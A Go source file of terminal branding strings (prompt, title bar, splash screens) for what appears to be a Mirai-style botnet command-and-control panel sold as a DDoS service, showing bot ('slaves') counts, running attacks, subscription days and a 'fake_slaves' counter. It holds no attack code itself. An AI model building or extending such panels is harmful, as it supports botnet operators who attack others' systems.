package branding 


const (

	//stores our branding for which counts as our splashs
	// `clear-splash.itl`, `prompt.itl`, `termfx-title.itl`, `title.itl`, `welcome.itl` 
	

	ClearSplash string = "<<clear()>>" 

	Prompt string = "\033[2K\r\x1b[0m \x1b[48;5;234m\x1b[38;5;9m <<user.username()>> ● <<cnc()>> \x1b[0m ►► \x1b[97m"

	TermFXTitle string = "<<spinner(\"spinner\")>> User: <<username()>> :: Sessions: <<online()>> :: Occurring Attacks: <<myrunning()>> :: Days left: <<daysleft()>> :: Slaves: <<slaves(\"fake_slaves\")>> :: <<spinner(\"spinner\")>>"

	Title string = "\033]0; <<cnc()>> - SLAVES [<<global.slaves(\"mirai\")>>] - COMMANDERS [<<global.online()>>] - ROUTINES: [<<sys.routines()>>]\007"

	WelcomeSplash string = ""+
		"<?\r\n"+
		"    //fireworks gif\r\n"+
		"    colour.gif(\"data/world.gif\", user.height(), user.length(), 1)\r\n"+
		"\r\n"+
		"    clear(); //clears screen\r\n"+
		"    var discord = \"https://discord.gg/399HtaNs\"\r\n"+
		"    var user string = user.username()\r\n"+
		"?>\r\n"+
		"\033[38;5;15mWelcome <<user.username()>>, Join our Discord <<colour.marshal(discord, \"230,255,0\", \"255,0,100\", \"138,43,226\")>>\x1b[0m\r\n"+
		"<?\r\n"+
		"    if user.CanAccess(\"admin\") {\r\n"+
		"        var detail string = colour.marshal(\"what a lovely surprise \"+user+\", it's an admin user!\", \"255,0,200\", \"5,255,255\")\r\n"+
		"        echo(detail)\r\n"+
		"    }\r\n"+
		"?>\r\n"+
		" \r\n"+
		" \r\n"+
		" \r\n"
)